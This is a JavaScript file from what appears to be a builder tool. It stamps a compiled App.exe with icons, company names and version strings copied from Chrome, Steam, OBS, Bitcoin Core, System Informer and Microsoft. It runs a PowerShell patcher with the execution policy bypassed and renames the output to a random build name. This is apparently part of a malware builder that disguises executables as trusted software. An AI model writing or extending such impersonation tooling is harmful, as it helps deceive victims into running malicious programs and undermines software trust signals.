


console.log('[Resource Popup] Script file loaded - Encoding Fix');

const PREDEFINED_METADATA = {
    'chrome.ico': { productName: 'Google Chrome', companyName: 'Google LLC', description: 'Google Chrome Web Browser', copyright: 'Copyright (c) 2024 Google LLC', fileVersion: '120.0.6099.130', productVersion: '120.0.6099.130' },
    'epic games.ico': { productName: 'Epic Games Launcher', companyName: 'Epic Games, Inc.', description: 'Epic Games Launcher Setup', copyright: 'Copyright (c) 2024 Epic Games, Inc.', fileVersion: '15.17.1.0', productVersion: '15.17.1.0' },
    'obs.ico': { productName: 'OBS Studio', companyName: 'OBS Project', description: 'Open Broadcaster Software', copyright: 'Copyright (c) 2024 OBS Project', fileVersion: '30.0.2.0', productVersion: '30.0.2.0' },
    'setup.ico': { productName: 'Setup Installer', companyName: 'Microsoft Corporation', description: 'Windows Setup Installer', copyright: 'Copyright (c) 2024 Microsoft Corporation', fileVersion: '10.0.19041.1', productVersion: '10.0.19041.1' },
    'steam.ico': { productName: 'Steam', companyName: 'Valve Corporation', description: 'Steam Gaming Platform', copyright: 'Copyright (c) 2024 Valve Corporation', fileVersion: '2.10.91.91', productVersion: '2.10.91.91' },
    'systeminformer.ico': { productName: 'System Informer', companyName: 'Winsider Seminars & Solutions, Inc.', description: 'System Informer', copyright: 'Copyright (c) 2024 Winsider Seminars', fileVersion: '3.0.7258.0', productVersion: '3.0.7258.0' },
    'bitcoin.ico': { productName: 'Bitcoin Core', companyName: 'The Bitcoin Core Developers', description: 'Bitcoin Core', copyright: 'Copyright (C) 2009-2024 The Bitcoin Core Developers', fileVersion: '28.1.0.0', productVersion: '28.1.0.0' },
    'hwinfo.ico': { productName: 'System Informer', companyName: 'Winsider Seminars & Solutions, Inc.', description: 'System Informer', copyright: 'Copyright (c) 2024 Winsider Seminars', fileVersion: '3.0.7258.0', productVersion: '3.0.7258.0' }
};

let currentIconPath = null;
let resourcePopupInitialized = false;

function getRootPath() {
    let cwd = process.cwd();
    if (cwd.toLowerCase().endsWith('gui') || cwd.toLowerCase().endsWith('gui\\')) return path.join(cwd, '..');
    return cwd;
}


window.initResourcePopup = function () {
    if (resourcePopupInitialized) return;

    const modal = document.getElementById('resourceModal');
    const gridItems = document.querySelectorAll('.grid-item');
    const btnRandomIcon = document.getElementById('btnRandomIcon');
    const btnApplyResources = document.getElementById('btnApplyResources');
    const iconPreview = document.getElementById('iconPreview');
    const selectedIconName = document.getElementById('selectedIconName');

    const closeBtn = document.querySelector('.close-modal');
    if (closeBtn) closeBtn.onclick = () => modal.classList.remove('active');

    const btnChooseIcon = document.getElementById('btnChooseIcon');
    const iconFileInput = document.getElementById('iconFileInput');

    if (btnChooseIcon && iconFileInput) {
        btnChooseIcon.onclick = () => iconFileInput.click();
        iconFileInput.onchange = (e) => {
            const file = e.target.files[0];
            if (file) {

                updateIconPreview(file.path, true);
            }
        };
    }

    function updateIconPreview(filePath, isCustom = false) {
        currentIconPath = filePath;
        let filename = filePath.split(/[/\\]/).pop();

        const m = PREDEFINED_METADATA[filename.toLowerCase()];
        if (m) {
            document.getElementById('inputCompanyName').value = m.companyName;
            document.getElementById('inputProductName').value = m.productName;
            document.getElementById('inputDescription').value = m.description;
            document.getElementById('inputCopyright').value = m.copyright;
            document.getElementById('inputFileVersion').value = m.fileVersion || '1.0.0.0';
            document.getElementById('inputProductVersion').value = m.productVersion || '1.0.0.0';
        }

        if (iconPreview) {
            if (isCustom) {
                try {
                    const iconData = fs.readFileSync(filePath);
                    const base64Icon = iconData.toString('base64');
                    iconPreview.src = `data:image/x-icon;base64,${base64Icon}`;
                } catch (err) {
                    console.error('Error loading custom icon:', err);
                    iconPreview.src = `../../icon/default.ico`;
                }
            } else {
                iconPreview.src = `../../icon/${filename}`;
            }
            iconPreview.style.display = 'block';
            const placeholder = document.querySelector('.placeholder-icon');
            if (placeholder) placeholder.style.display = 'none';
        }
        if (selectedIconName) selectedIconName.textContent = filename;
    }

    gridItems.forEach(item => {
        item.onclick = () => updateIconPreview(path.join(getRootPath(), 'icon', item.getAttribute('data-filename')));
    });

    if (btnRandomIcon) {
        btnRandomIcon.onclick = () => {
            const keys = Object.keys(PREDEFINED_METADATA);
            updateIconPreview(path.join(getRootPath(), 'icon', keys[Math.floor(Math.random() * keys.length)]));
        };
    }

    if (btnApplyResources) {
        btnApplyResources.onclick = () => {
            if (btnApplyResources.classList.contains('loading')) return;

            if (!currentIconPath) {
                showNotification('Please select an icon!', 'error');
                return;
            }

            const buildFolder = path.join(getRootPath(), 'build');
            let exePath = path.join(buildFolder, 'App.exe');
            if (!fs.existsSync(exePath)) exePath = path.join(buildFolder, 'app.exe');

            if (!fs.existsSync(exePath)) {
                showNotification('Executable not found in build/ folder!', 'error');
                return;
            }


            btnApplyResources.classList.add('loading');
            const originalInnerHTML = btnApplyResources.innerHTML;
            btnApplyResources.innerHTML = `<i class='bx bx-loader-alt'></i> Processing...`;


            let companyName = document.getElementById('inputCompanyName').value || 'Microsoft Corporation';
            companyName = companyName.replace(/[^\x00-\x7F]/g, "");

            window.executeRessources(exePath, currentIconPath, companyName, buildFolder, originalInnerHTML);
        };
    }

    resourcePopupInitialized = true;
};

window.executeRessources = function (exePath, iconPath, companyName, buildFolder, originalInnerHTML) {
    const { spawn } = require('child_process');

    const scriptPath = path.join(buildFolder, 'ressources.ps1');

    const args = [
        '-ExecutionPolicy', 'Bypass',
        '-File', scriptPath,
        '-ExePath', exePath,
        '-IconPath', iconPath,
        '-CompanyName', companyName
    ];

    const patcher = spawn('powershell.exe', args, { cwd: buildFolder });
    let success = false;

    patcher.stdout.on('data', (data) => {
        const out = data.toString();
        console.log('[Patcher Output]', out);
        if (out.includes('[OK] Success')) success = true;
    });

    patcher.stderr.on('data', (data) => console.error('[Patcher Error]', data.toString()));

    patcher.on('close', (code) => {
        const btn = document.getElementById('btnApplyResources');
        if (btn && originalInnerHTML) {
            btn.classList.remove('loading');
            btn.innerHTML = originalInnerHTML;
        }

        if (window.currentLoadingNotification) {
            window.currentLoadingNotification.remove();
            window.currentLoadingNotification = null;
        }

        if (code === 0 && success) {
            const buildName = `Build_${Math.random().toString(36).substring(7).toUpperCase()}.exe`;
            const finalPath = path.join(getRootPath(), buildName);

            try {
                fs.renameSync(exePath, finalPath);
                showNotification(`✅ SUCCESS: ${buildName}`, 'success');
                const modal = document.getElementById('resourceModal');
                if (modal) modal.classList.remove('active');
            } catch (e) {
                showNotification('Error moving binary: ' + e.message, 'error');
            }
        } else {
            showNotification('Patcher Failed! Check console logs.', 'error');
        }
    });
};

window.applyDefaultResources = function () {
    const buildFolder = path.join(getRootPath(), 'build');
    let exePath = path.join(buildFolder, 'App.exe');
    if (!fs.existsSync(exePath)) exePath = path.join(buildFolder, 'app.exe');

    if (!fs.existsSync(exePath)) {
        showNotification('Executable not found in build/ folder!', 'error');
        return;
    }


    const iconPath = path.join(getRootPath(), 'icon', 'systeminformer.ico');
    const companyName = "Winsider Seminars & Solutions, Inc.";


    if (!fs.existsSync(iconPath)) {
        showNotification('Default icon (systeminformer.ico) not found!', 'error');
        return;
    }

    window.currentLoadingNotification = showNotification('Applying Default Resources<span class="loading-dots"></span>', 'info', 0);
    window.executeRessources(exePath, iconPath, companyName, buildFolder, null);
};
